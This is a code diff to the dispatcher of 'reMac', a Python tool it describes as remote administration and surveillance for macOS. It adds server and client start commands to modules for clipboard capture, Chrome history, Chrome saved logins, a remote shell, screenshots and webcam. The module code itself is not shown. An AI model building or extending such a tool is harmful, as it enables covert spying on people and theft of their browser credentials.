@@ -1,5 +1,9 @@
 import sys, getopt
 import os
+
+from apps import reMac_server
+from apps import reMac_client
+
 from modules import mod_hello
 from modules import mod_clipboard
 from modules import mod_chrome_history
@@ -9,12 +13,14 @@ from modules import mod_screenshot
 from modules import mod_webcam
 
 mymod = mod_hello.mod_hello()
+myreMac_server = reMac_server.reMac_server()
+myreMac_client = reMac_client.reMac_client()
 
 reMacModules = {
-    'c': mod_clipboard.mod_clipboard(),
+    'cb': mod_clipboard.mod_clipboard(),
     'ch': mod_chrome_history.mod_chrome_history(),
     'cl': mod_chrome_logins.mod_chrome_logins(),
-    's': mod_shellcmd.mod_shellcmd(),
+    'sh': mod_shellcmd.mod_shellcmd(),
     'sc': mod_screenshot.mod_screenshot(),
     'wc': mod_webcam.mod_webcam()
 }
@@ -26,6 +32,7 @@ appDesc = "Remote administration and surveillance for macOS - With Python"
 appDate = "2021-08-18"
 conHost = "192.168.0.49"
 conPort = "6890"
+clientStarted = False
 
 def print_help():
     print(f'#========================================================================#')
@@ -44,13 +51,19 @@ def processInput(input):
         sys.exit(1)
     elif input == "h":# or input == "help":
         print_help()
-    elif input == "c":# or input == "clipboard":
+    elif input == "helloWorld":  # or input == "help":
+        mymod.run_mod()
+    elif input == "s":# or input == "help":
+        myreMac_server.start_server()
+    elif input == "c":# or input == "help":
+        myreMac_client.start_client()
+    elif input == "cb":# or input == "clipboard":
         reMacModules[input].run_mod()
     elif input == "ch":# or input == "chromeHistory":
         reMacModules[input].run_mod()
     elif input == "cl":# or input == "chromeLogins":
         reMacModules[input].run_mod()
-    elif input == "s":# or input == "shell":
+    elif input == "sh":# or input == "shell":
         reMacModules[input].run_mod()
     elif input == "sc":# or input == "screenshot":
         reMacModules[input].run_mod()
